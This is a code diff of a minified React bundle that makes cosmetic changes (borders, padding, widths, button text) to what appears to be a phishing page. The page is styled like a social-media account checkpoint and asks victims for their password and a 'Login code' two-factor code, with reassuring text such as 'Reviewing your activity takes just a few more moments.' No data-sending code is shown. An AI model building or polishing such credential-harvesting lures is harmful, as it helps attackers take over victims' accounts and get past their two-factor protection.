@@ -8929,7 +8929,7 @@
               left: 0,
               right: 0,
               bottom: 0,
-              backgroundColor: "#F5FFFA",
+              backgroundColor: "rgb(245, 255, 250)",
             },
             content: {
               position: "absolute",
@@ -8941,7 +8941,7 @@
               background: "#fff",
               overflow: "auto",
               WebkitOverflowScrolling: "touch",
-              borderRadius: "25px",
+              borderRadius: "10px",
               outline: "none",
               padding: "20px",
             },
@@ -10819,9 +10819,11 @@
                   children: (0, c.jsxs)("div", {
                     style: {
                       backgroundColor: "white",
+                      justifyContent: "space-between",
+                      alignItems: "center",
                       minHeight: 200,
-                      maxWidth: 700,
-                      borderRadius: 5,
+                      maxWidth: 600,
+                      borderRadius: 20,
                       border: "1px solid #d0d0d0",
                       display: "flex",
                       paddingTop: 30,
@@ -10850,13 +10852,13 @@
                           (0, c.jsx)("div", {
                             className: "",
                             style: { fontWeight: "bold" },
-                            children: "Hi, We are receiving your information",
+                            children: "We are receiving your information",
                           }),
                           (0, c.jsx)("div", {
                             className: "",
                             style: { marginTop: 20, marginBottom: 20 },
                             children:
-                              "Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account",
+                              "Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account.",
                           }),
                           (0, c.jsxs)("div", {
                             className: "",
@@ -10959,6 +10961,7 @@
                   },
                   children: (0, c.jsxs)("div", {
                     style: {
+                      width: "100%",
                       backgroundColor: "white",
                       minHeight: 200,
                       borderRadius: 5,
@@ -10977,8 +10980,8 @@
                       (0, c.jsx)("hr", {
                         style: {
                           borderTop: "1px solid #d0d0d0",
-                          marginTop: 20,
-                          marginBottom: 20,
+                          marginTop: 10,
+                          marginBottom: 10,
                         },
                       }),
                       (0, c.jsxs)("div", {
@@ -11026,7 +11029,6 @@
                             children: (0, c.jsx)("img", {
                               src: "/resources/otp.png",
                               width: "100%",
-                              height: 250,
                               borderRadius: 10,
                               alignItems: "center",
                               paddingLeft: 15,
@@ -11044,10 +11046,12 @@
                               (0, c.jsx)("input", {
                                 type: "text",
                                 style: {
+                                  width: "60%",
                                   padding: "15px 10px 15px 10px",
-                                  fontSize: 14,
-                                  fontWeight: 400,
+                                  fontSize: 15,
+                                  fontWeight: 500,
                                   border: "1px solid #d0d0d0",
+                                  borderRadius: 10,
                                 },
                                 placeholder: "Login code",
                                 value: f,
@@ -11082,7 +11086,11 @@
                         ],
                       }),
                       (0, c.jsx)("hr", {
-                        style: { borderTop: "0.5px solid #FFFFFF" },
+                        style: {
+                          borderTop: "1px solid #d0d0d0",
+                          marginTop: 10,
+                          marginBottom: 10,
+                        },
                       }),
                       (0, c.jsxs)("div", {
                         className: "footercard",
@@ -11092,27 +11100,21 @@
                           alignItems: "center",
                           paddingLeft: 20,
                           paddingRight: 20,
-                          paddingBottom: 10,
-                          paddingTop: 5,
+                          paddingBottom: 20,
+                          paddingTop: 10,
                         },
                         children: [
-                          (0, c.jsx)("div", {
-                            style: {
-                              fontSize: 14,
-                              fontWeight: 600,
-                              color: "#385898",
-                            },
-                            children: "Need another way to authenticate?",
-                          }),
                           (0, c.jsx)("button", {
                             style: {
-                              paddingRight: 20,
-                              paddingLeft: 20,
-                              height: 32,
+                              width: "100%",
+                              paddingRight: 100,
+                              paddingLeft: 100,
+                              height: 45,
                               fontWeight: "bold",
-                              fontSize: 14,
-                              borderRadius: 5,
+                              fontSize: 18,
+                              borderRadius: 30,
                               borderWidth: 0,
+                              alignItems: "center",
                               backgroundColor:
                                 0 === f.length || 0 !== g
                                   ? "#7DAFF9"
@@ -11160,7 +11162,7 @@
                                   );
                                 }, 1e3)));
                             },
-                            children: "Send",
+                            children: "Submit",
                           }),
                         ],
                       }),
@@ -11180,7 +11182,7 @@
             marginRight: "-50%",
             transform: "translate(-50%, -50%)",
             width: "80%",
-            maxWidth: 650,
+            maxWidth: 450,
           },
         };
       l().setAppElement("#root");
@@ -11269,23 +11271,16 @@
                     },
                   }),
                   (0, c.jsx)("div", {
+                    style: {
+                      paddingBottom: 20,
+                    },
+
                     children:
                       "For your security, you must enter your password to continue.",
                   }),
                   (0, c.jsxs)("div", {
                     className: "",
                     children: [
-                      (0, c.jsx)("div", {
-                        className: "",
-                        style: {
-                          fontWeight: "600",
-                          color: "black",
-                          fontSize: 14,
-                          marginTop: 20,
-                          marginBottom: 5,
-                        },
-                        children: "Password",
-                      }),
                       (0, c.jsx)("input", {
                         type: "password",
                         value: s,
@@ -11298,9 +11293,11 @@
                           fontSize: 14,
                           borderColor: "#d0d0d0",
                           borderWidth: 0.1,
-                          borderRadius: 5,
+                          borderRadius: 10,
                           border: "1px solid #d0d0d0",
                         },
+                        placeholder: "Password",
+                        color: "gray",
                       }),
                     ],
                   }),
@@ -11322,13 +11319,14 @@
                           " ",
                           (0, c.jsx)("button", {
                             style: {
-                              paddingRight: 30,
-                              paddingLeft: 30,
+                              width: "100%",
+                              paddingRight: 100,
+                              paddingLeft: 100,
                               marginTop: 20,
                               height: 45,
                               fontWeight: "bold",
                               fontSize: 18,
-                              borderRadius: 5,
+                              borderRadius: 30,
                               borderWidth: 0,
                               backgroundColor: s ? "#3084F4" : "#7DAFF9",
                               cursor: "pointer",
@@ -11380,7 +11378,7 @@
                   paddingRight: 20,
                   borderColor: "#000000",
                   borderWidth: 0.2,
-                  borderRadius: 10,
+                  borderRadius: 20,
                   border: "1px solid #d0d0d0",
                 },
                 children: [
@@ -11469,8 +11467,9 @@
                 children: (0, c.jsx)("img", {
                   src: "/resources/unlock.png",
                   width: "100%",
-                  height: 300,
-                  borderRadius: 10,
+                  style: {
+                    borderRadius: "30px",
+                  },
                 }),
               }),
               (0, c.jsxs)("div", {
@@ -11521,7 +11520,7 @@
                       fontSize: 14,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
-                      borderRadius: 5,
+                      borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
                   }),
@@ -11553,7 +11552,7 @@
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
-                      borderRadius: 5,
+                      borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
                   }),
@@ -11585,7 +11584,7 @@
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
-                      borderRadius: 5,
+                      borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
                   }),
@@ -11617,7 +11616,7 @@
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
-                      borderRadius: 5,
+                      borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
                   }),
@@ -11649,7 +11648,7 @@
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
-                      borderRadius: 5,
+                      borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
                   }),
@@ -11681,7 +11680,7 @@
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
-                      borderRadius: 5,
+                      borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
                   }),
@@ -11715,7 +11714,7 @@
                   height: 45,
                   fontWeight: "bold",
                   fontSize: 18,
-                  borderRadius: 5,
+                  borderRadius: 30,
                   borderWidth: 0,
                   backgroundColor: p ? "#3084F4" : "#7DAFF9",
                   cursor: "pointer",
